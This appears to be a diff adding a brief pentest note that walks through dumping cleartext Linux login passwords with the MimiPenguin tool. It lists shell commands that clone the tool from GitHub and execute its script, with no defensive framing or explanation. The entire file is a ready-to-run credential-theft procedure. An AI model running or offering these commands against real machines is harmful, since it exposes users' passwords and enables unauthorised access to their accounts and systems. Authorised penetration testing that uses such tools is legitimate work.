@@ -1,0 +1,7 @@
+Dump Cleartext Password in Linux PC using MimiPenguin
+
+cd Desktop
+git clone https://github.com/huntergregal/mimipenguin.git
+ls
+cd mimipenguin
+./mimipenguin.sh
